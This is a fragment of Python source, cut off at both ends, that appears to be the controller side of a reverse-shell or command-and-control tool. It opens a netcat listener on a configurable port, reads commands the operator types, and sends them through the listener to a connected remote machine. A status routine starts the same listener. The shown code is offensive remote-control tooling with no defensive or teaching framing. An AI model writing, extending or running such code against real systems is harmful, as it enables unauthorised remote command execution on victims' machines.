...
if 'darwin' in sys.platform:  #not necessary
    NETCAT_COMMAND = 'nc -nvlk' #not necessary
else:
    NETCAT_COMMAND = 'nc -nvlp'  #not necessary

def shell():
    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | sleep 1 && %s %s >/dev/null;' % (NETCAT_COMMAND, LPORT)) # |timeout 1 nc -lp %s>/dev/null;' %LPORT
    shell()

def status():
    proc = Popen('sleep 1 && %s %s' % (NETCAT_COMMAND, LPORT), shell=True, stdout=PIPE, ) #timeout 1 nc -lp %s' %LPORT, shell= True, stdout=PIPE,
